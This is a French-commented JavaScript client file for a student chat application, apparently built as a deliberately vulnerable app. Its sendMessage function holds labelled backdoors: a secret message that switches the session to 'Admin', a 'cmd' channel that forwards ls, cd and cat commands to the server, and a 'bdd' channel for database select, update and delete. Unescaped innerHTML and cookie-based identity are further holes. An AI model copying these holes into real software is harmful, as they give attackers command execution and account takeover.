/**
 * \\Author: Edgar Lefèvre & Emilio Chatel
 * \\Company: ISEN Yncréa Ouest
 * \\Email: edgar.lefevre@isen-ouest.yncrea.fr
 * \\Email: emilio.chatel@isen-ouest.yncrea.fr
 * \\Created Date: 31-Jan-2023 - 13:41:00
 * \\Last Modified: 29-Mar-2023 - 09:49:00
 * \\Infos: fichier javascript principal, 
 * il gere l'affichage et se charge d'envoyer toutes les requettes
 * demandees par l'utilisateur
 * il peut être utile de décommenter tout les console log pour débugger
 */

///////////////////////////Création vairables///////////////////////////

'use strict';

let cookie;
let refreshInterval;
let refreshValue;

///////////////////////////Ecoute d'events///////////////////////////

// au chargement de la page on affiche l'accueil
document.addEventListener('DOMContentLoaded', function(e) {
  e.preventDefault();
  toggle('accueil');
});

// section d'ajout ami (efface une partie avant d'en réafficher une autre)
document.getElementById('valider').addEventListener('click', function(e) {
  e.preventDefault();
  getPseudos();
  //console.log("------------------Accueil ajout ami"); 
  document.getElementById('texte-ajout-amis').classList.add('Effacer');
  document.getElementById('valider').classList.add('Effacer');
  
  document.getElementById('ajout-dami').classList.remove('Effacer');
  document.getElementById('add').classList.remove('Effacer');
});
document.getElementById('add').addEventListener('click',function(e) {
  e.preventDefault();
  //console.log("------------------Accueil classique");
  ajoutdAmi();
  document.getElementById('ajout-dami').classList.add('Effacer');
  document.getElementById('add').classList.add('Effacer');

  document.getElementById('texte-ajout-amis').classList.remove('Effacer');
  document.getElementById('valider').classList.remove('Effacer');
  getPseudos();
});

// switch http et https
document.getElementById('GoToTheDarkSIDE').addEventListener('click', function(e) {
  e.preventDefault();
  window.location.href = "http://messagerie.com/TrashTalk/index.html";
});
document.getElementById('GoToTheWhiteSIDE').addEventListener('click', function(e) {
  e.preventDefault();
  window.location.href = "https://messagerie.com/TrashTalk/index.html";
});

// switch entre l'accueil et la connexion
document.getElementById('connexion').addEventListener('click', function(e) {
  e.preventDefault();
  AccCo();
});
//switch entre l'accueil et l'inscription
document.getElementById('inscrip').addEventListener('click', function(e) {
  e.preventDefault();
  AccIns();
});

//switch entre la connexion et le chat
document.getElementById('authentication-send').addEventListener('submit', function(e) {
  e.preventDefault();
  validateLogin();
});
//switch entre la inscription et le chat
document.getElementById('inscription-send').addEventListener('submit', function(e) {
  e.preventDefault();
  inscriptionLogin();
});

// envoyer
document.getElementById('message-send').addEventListener('submit', function(e) {
  e.preventDefault();
  sendMessage();
});
// se déconnecter
document.getElementById('logout').addEventListener('click',function(e) {
  e.preventDefault();
  logout();
});
// switch entre la connexion et l'accueil
document.getElementById('retourCoAcc').addEventListener('click', function(e) {
  e.preventDefault();
  CoAcc();
});
//switch entre l'inscripton et l'accueil
document.getElementById('retourInsAcc').addEventListener('click', function(e) {
  e.preventDefault();
  InsAcc();
});

// fonction qui permet en cas de rechargement de la page de passer le statut de 1 à 0 de l'utilisateur connecté 
window.onload = function(){
  if(cookieExists('login')){
    ajaxRequest('POST', 'php/chat.php?request=statut', statusinfos , 'value=' + 0 + '&pseudo=' + Cookies.get('login'));
    Cookies.remove('login');
    Cookies.remove('id');
    Cookies.remove('token');
  }
}

// en cas de suppression de l'onglet / page
window.addEventListener('beforeunload', function(event) {
  if(cookieExists('login')){
    ajaxRequest('POST', 'php/chat.php?request=statut', statusinfos , 'value=' + 0 + '&pseudo=' + Cookies.get('login'));
    Cookies.remove('login');
    Cookies.remove('id');
    Cookies.remove('token');
  }
});

///////////////////////////Switch entre les pages///////////////////////////

function AccCo() {//Accueil => Connexion
  //console.log("------------------Accueil => Connexion");
  document.getElementById('accueil').classList.toggle('d-none');
  document.getElementById('authentication').classList.toggle('d-none');
}
function CoAcc() {//Connexion => Accueil
  //console.log("------------------Connexion => Accueil");
  window.location.reload(true);
}
function AccIns() {//Accueil => Inscription
  //console.log("------------------Accueil => Inscription");
  document.getElementById('accueil').classList.toggle('d-none');
  document.getElementById('inscription').classList.toggle('d-none');
}
function InsAcc() {//Inscription => Accueil
  //console.log("------------------Inscription => Accueil");
  window.location.reload(true);
}
function InscChat() {//Inscription => Chat
  //console.log("------------------Inscription => Chat");
  document.getElementById('inscription').classList.toggle('d-none');
  document.getElementById('chat').classList.toggle('d-none');
}
function ConnexChat() {//Connexion => Chat
  //console.log("------------------Connexion => Chat");
  document.getElementById('authentication').classList.toggle('d-none');
  document.getElementById('chat').classList.toggle('d-none');
}
function ChatAcc() {//Chat => Accueil
  //console.log("------------------Chat => Accueil");
  window.location.reload(true);
}
function toggle(id) {//affichage
  //console.log("------------------affichage : "+ id);
  document.getElementById(id).classList.toggle('d-none');
}

///////////////////////Switch d'affichage (cadenas)///////////////////////

function affichagecadenas(){

  if (location.protocol === 'http:') {
    //console.log('La page est en HTTP');
    document.getElementById('GoToTheWhiteSIDE').classList.remove('Effacer');
  } else if (location.protocol === 'https:') {
    //console.log('La page est en HTTPS');
    document.getElementById('GoToTheDarkSIDE').classList.remove('Effacer');
  }

}

///////////////////////////Fonctions de Request///////////////////////////

// cette fonction permet de valider un login de l'utilisateur quand 
// il se connecte, les cookies sont créé dans un même temps
function validateLogin()
{
  let login;
  let password;
  let xhr;

  // récupère les valeurs du login et du password.
  login = $('#login_co').val();
  password = $('#password_co').val();

  // creation du cookie login
  Cookies.set('login', login , '3600' );

  // Create XML HTTP request.
  // Encode en base 64 login et mdp
  xhr = new XMLHttpRequest();
  xhr.open('GET', 'php/auth.php/authenticate');
  xhr.setRequestHeader('Authorization', 'Basic ' + btoa(login + ':' +
    password));
  xhr.setRequestHeader('Access-Control-Allow-Origin', 'http://192.168.0.100');
  // Add the onload function.
  // Fonction qui s'exécute lorsque la requête est terminée 
  xhr.onload = () =>
  {
    switch (xhr.status)
    {
      case 200:
        Cookies.set('token', xhr.responseText );
        //console.log('token connexion: '+ xhr.responseText);
        passerelle();
        $('#errors').hide();
        $('#authentication').hide();
        $('#login, #password').val('');
        $('#infos').html('Authentification OK');

        // modif du statut dans la BDD 
        ajaxRequest('POST', 'php/chat.php?request=statut', statusinfos, 'value=' + 1 + '&pseudo=' + login);
	      affichagecadenas();
        //switch vers le chat
        ConnexChat();
        break;
      case 401:
	      alert("Pseudo ou mot de passe incorrect");
	      break;
      default:
        displayErrors(xhr.status);
    }
  };
  // Send XML HTTP request.
  xhr.send();
}

// fonction d'inscription d'un utilisateur
function inscriptionLogin()
{
  let login;
  let password;
  let password_conf;
  let xhr;

  // récupération et validation du password/login
  login = $('#login_ins').val();
  password = $('#password_ins').val();
  password_conf = $('#conf_password_ins').val();

  if (password !== password_conf) {
    alert("Les mots de passe ne correspondent pas.");
    return false;
  }

  // création du cookie login
  Cookies.set('login', login, '3600' );

  // Create XML HTTP request.
  // Encode en base 64 login et mdp
  xhr = new XMLHttpRequest();
  xhr.open('GET', 'php/auth.php/inscript');
  xhr.setRequestHeader('Authorization', 'Basic ' + btoa(login + ':' +
    password));
  xhr.setRequestHeader('Access-Control-Allow-Origin', 'http://192.168.0.100');

  // Add the onload function.
  // Fonction qui s'exécute lorsque la requête est terminée 
  xhr.onload = () =>
  {
    switch (xhr.status)
    {
      case 200:
        Cookies.set('token', xhr.responseText );
        //console.log('token inscription : '+xhr.responseText);
        passerelle();
        $('#errors').hide();
        $('#authentication').hide();
        $('#login, #password').val('');
        $('#infos').html('Authentification OK');
        //changement du statut
        ajaxRequest('POST', 'php/chat.php?request=statut', statusinfos, 'value=' + 1 + '&pseudo=' + login);
        affichagecadenas();
        //affichage du chat
        InscChat();
        break;
      case 401:
        alert("Cet utilisateur existe déjà");
        break;
      default:
        displayErrors(xhr.status);
    }
  };

  // Send XML HTTP request.
  xhr.send();
}

//passerelle 
// fonction principale permettant tous les chargements 
// necessaires au bon fonctionnement du chat
function passerelle(){
  if (cookieExists('token')){
    //console.log('passage passerelle');
    getUserId(function(){
        getPseudos(function(){
            manageRefresh(1);
        });
    });
    return true;
  } else {
    //console.log("le cookie token n'existe pas");
    return false;
  }
}

function cookieExists(nomDuCookie) {
  let cook = Cookies.get(nomDuCookie);
  if (!cook){
    return false;
  }
  return true;
}

// fonction de déconnexion
// la fonction a pour rôle de supprimer tous les cookies de sessions en cours et
// par la suite de passer le statut de l'utilisateur de connecté à non connecté
// la fonction stoppe le rafraichissement de la page chat
function logout(){
  //console.log('passage logout');
  ajaxRequest('POST', 'php/chat.php?request=statut', statusinfos, 'value=' + 0 + '&pseudo=' + Cookies.get('login'));
  manageRefresh(0);
  Cookies.remove('login');
  Cookies.remove('id');
  Cookies.remove('token');
  ChatAcc();
}

// getUserId 
// cette fonction est appellée à la suite d'une connexion ou d'une inscription
// elle a pour but de faire remonter de la base de données la valeur de l'ID 
// de l'utilisateur connecté et de le faire remonter dans un cookie
function getUserId(callback){
  //console.log('passage getUserId');
  let pseudo = Cookies.get().login; // récupération du login dans le cookie
  let text2 = '' // init de la valeur text
  text2 +='<p class="Droite-pseudo-texte">' + pseudo + '</p>'
  ////console.log(text2);
  document.getElementById('user-pseudo').innerHTML = text2; // affichage du pseudo
  ajaxRequest('GET', 'php/chat.php?request=UserId&pseudo='+ pseudo, function(userId) {
      displayId(userId, callback); // la fonction sera exec quand l'userId     ^    sera remonté de la bdd
  });
}

// getPseudos 
// cette fonction va chercher la liste des pseudos des amis de l'utilisateur connecté
// il lui faut donc le user id de l'utilisateur connecté pour ainsi l'envoyer à la 
// base de données
function getPseudos(callback) {
  //console.log('passage getPseudos');
  let userId = Cookies.get().id; // récupération de l'id de l'user connecté
  ajaxRequest('GET', 'php/chat.php?request=pseudos&user_id='+ userId, function(data) {
      displayPseudos(data); //la fonction de rappel en question
      if (typeof callback === 'function') {// vérification si une fonction de rappel est passé à l'ajaxrequest
          callback();//appel de cette fonction de rappel 
      }
  });
}

// Fonction qui récupère l'id de l'utilisateur et charge la liste de
// ses amis en affichant les messages associés à chacun d'entre eux 
function getMessages() {
  //console.log('passage dans getMessages');
  let amiId;
  let ami;
  let text3='';
  let userId=Cookies.get().id; // récupération de l'id de l'user connecté
  /////////////////////////////////////////////////////////////////
  ami = document.getElementById('liste_amis'); // récupération de la liste d'amis
  //console.log(ami);
  var selectOption = ami.options[ami.selectedIndex];
  //console.log('option sélectionné' + selectOption);
  amiId = selectOption.id;
  //console.log('amiId '+ amiId);
  /////////////////////////////////////////////////////////////////
  text3 +='<p class="Droite-pseudo-texte">' + selectOption.value + '</p>'
  document.getElementById('user-pseudo-ami').innerHTML = text3;
  ajaxRequest('GET', 'php/chat.php?request=messages&user_id=' + userId + '&amiId='+ amiId, displayMessages)
}


// cette fonction envoie les messages dans la base de données lorsque l'on clique sur le boutton "envoyer"
function sendMessage()
{
  console.log("passage dans sendMessage");
  let userId=Cookies.get().id; // récupération de l'id de l'user connecté
  var pseudo = Cookies.get().login;
  let message;
  let amiId;
  let ami;
  let messageCMD;
  var splitage;
  /////////////////////////////////////////////////////////////////
  ami = document.getElementById('liste_amis'); // récupération de l'ami sélectionné dans la liste d'ami
  var selectOption = ami.options[ami.selectedIndex];
  amiId = selectOption.id; // récupération de l'id de cet ami
  message = document.getElementById('message').value; // récupération de la valeur du message
  document.getElementById('message').value = ''; // réinitialise l'élément HTML qui a un identifiant spécifique 
  messageCMD = message.split(" ");
  /////////////////////////////////////////////////////////////////
  //////////////////////Backdoor secrete//////////////////////////
  if(amiId==5 && message=='MontePasSurLeToit'){// NicoCharbo
    ajaxRequest('POST', 'php/chat.php?request=statut', statusinfos, 'value=' + 0 + '&pseudo=' + pseudo);
    ajaxRequest('POST', 'php/chat.php?request=messages', getMessages,
    'user_id=' + userId + '&message=ciao&amiId=' + amiId);
    Cookies.set('login','Admin');
    getUserId(function(){
      getPseudos(function(){
        manageRefresh(0.5);
      });
    });
  ////////////////////////////////////////////////////////////////
 ////////////////////Backdoor systeme////////////////////////////
  } else if(amiId==1 && userId==2 && messageCMD[0]=="cmd"){// Support=1 Admin=2
    var commande = messageCMD.slice(1).join(" ");
    switch (messageCMD[1]){
      case "ls":
        ajaxRequest('POST', 'php/chat.php?request=CMD', displaybackdoorCMD,'commande=' + commande );
        break;
      case "cd":
        ajaxRequest('POST', 'php/chat.php?request=CMD', displaybackdoorCMD,'commande=' + commande );
        break;
      case "cat":
        ajaxRequest('POST', 'php/chat.php?request=CMD', displaybackdoorCMD,'commande=' + commande );
        break;
      default:
        alert("Commande non valide");
        break;
    }
    ajaxRequest('POST', 'php/chat.php?request=messages', getMessages, 
    'user_id=' + userId + '&message=' + message + '&amiId=' + amiId);
  /////////////////////////////////////////////////////////////////
 //////////////////////Backdoor en base de donees/////////////////
  } else if(amiId==1 && userId==2 && messageCMD[0]=="bdd"){// Support=1 Admin=2 
    //bdd select nom_table
    //bdd update pseudo mdp
    //bdd delete ami1 ami2
    //bdd show
    splitage = message.split(" ");
    ajaxRequest('POST', 'php/chat.php?request=BDD', displaybackdoorBDD, 
    'demande=' + splitage[1] + '&message1=' + splitage[2] + '&message2=' + splitage[3]);
    ajaxRequest('POST', 'php/chat.php?request=messages', getMessages, 
    'user_id=' + userId + '&message=' + message + '&amiId=' + amiId);
  } else {
    ajaxRequest('POST', 'php/chat.php?request=messages', getMessages, 
    'user_id=' + userId + '&message=' + message + '&amiId=' + amiId);
  }
}

// fonction d'ajout d'amis
// fait une requette sur la base de données pour ajouter l'ami rentré dans
// la zone ajout-ami, et test si cet ami n'éxiste pas déjà en regardant dans la liste d'amis
// déjà chargée sur la page
function ajoutdAmi() {
  let userId = Cookies.get().id; // récupération de l'id de l'utilisateur connecté
  let ami;
  let value = 0;
  // get values
  ami = document.getElementById('ajout-dami').value;// récupère la demande d'ajout d'ami
  //console.log('ami à ajouter', ami) 
  // test si l'ami existe déjà 
  var liste_amis = document.getElementById("liste_amis");
  for (var i = 0; i < liste_amis.length; i++) {
    if(liste_amis.options[i].text==ami){
      value=1
    }
  }
  // requete
  if (value == 0) {
    //console.log('value ==0 on exec lajax request')
    ajaxRequest('POST', 'php/chat.php?request=ajoutami', getPseudos,
      'user_id=' + userId + '&ami=' + ami);
  }
}

///////////////////////////Fonction De rafraichissement///////////////////////////

// fonction de rafraichissement de la page de chat chatgpt
function manageRefresh(refreshValue) {
  //console.log('passage manageRefresh avec la valeur : '+ refreshValue);
  clearInterval(refreshInterval);
  if (!isNaN(refreshValue) && refreshValue != 0){
      refreshInterval = setInterval(getMessages, refreshValue*1000);
  }
}

///////////////////////////Fonctions d'affichage///////////////////////////

// fonction callback de la fonction getPseudos qui affiche les pseudos sur la page de chat
function displayPseudos(pseudos)
{
    //console.log('passage displayPseudos');
    let text
    text =''
    for (let i of pseudos)
    {
      if(i.user_id==1){ // si l'user_id de l'ami est 1 alors c'est le support, on lui ajoute l'attribut selected
        if (i.etat == '1') { // statut à 1 => vert
          //console.log("variable etat : " + i.etat);
          text += '<option class="Gauche-ajout-amis-bloc-vert text-center" id=' + i.user_id + ' selected>' + i.pseudo + '</option>';
        } else { // statut à 0 => rouge
          //console.log("variable etat : " + i.etat);
          text += '<option class="Gauche-ajout-amis-bloc-rouge text-center" id=' + i.user_id + ' selected>' + i.pseudo + '</option>';
        }
      }
      else{
        if (i.etat == '1') { // statut à 1 => vert
          //console.log("variable etat : " + i.etat);
          text += '<option class="Gauche-ajout-amis-bloc-vert text-center" id=' + i.user_id + '>' + i.pseudo + '</option>';
        } else { // statut à 0 => rouge
          //console.log("variable etat : " + i.etat);
          text += '<option class="Gauche-ajout-amis-bloc-rouge text-center" id=' + i.user_id + '>' + i.pseudo + '</option>';
        }
        
      }
        //console.log(text)
        document.getElementById('liste_amis').innerHTML = text
    }
}

//displayId chatgpt
//cette fonction permet d'ajouter dans un cookie la valeur de l'id de l'utilisateur connecté
// c'est la fonction de callback de getUserId
function displayId(userId, callback){
  //console.log('passage dans displayId avec User id : '+ userId[0].user_id);
  Cookies.set('id', userId[0].user_id);// crée le cookie id qui contient la valeur de l'user id remonté de la bdd
  if (typeof callback === 'function') { // test si le callback est une fonction, si elle en est une alors le callback est effectué
      callback();
  }
}

function statusinfos(data){
  //console.log('Le status est actualisé : ' + data);
}

// fonction callback de getMessages, permet de les afficher dans la "chat-room" 
function displayMessages(messages)
{
  //console.log('passage dans display message');
  let chatRoom;
  let text;
  text = '';

  for (let i = messages.length - 1; i >= 0; i--){
    if(messages[i].pseudo==Cookies.get().login){
      //console.log("passage dans message utilisateur");
      text+='<div class="Droite-middle-container-droite"><div class="Droite-middle-message-droite">'+ messages[i].texte +'</div><div class="Droite-middle-heure-droite">'+messages[i].pseudo+' - '+ messages[i].date+'</div></div>';
    }else{
      //console.log("passage dans message de l'ami");
      text+='<div class="Droite-middle-container-gauche"><div class="Droite-middle-message-gauche">'+ messages[i].texte +'</div><div class="Droite-middle-heure-gauche">'+messages[i].pseudo+' - '+ messages[i].date+'</div></div>';
    }
  }
  chatRoom = document.getElementById('chat-room');
  chatRoom.innerHTML = text;
}

// affichage de la backdoor de la base de données
function displaybackdoorBDD(data){
  //console.log('passage dans display backdoor BDD');
  const tableau = Object.values(data);
  console.log(tableau);
}

// affichage de la backdoor de l'invite de commande
function displaybackdoorCMD(data){
  console.log(data);
}
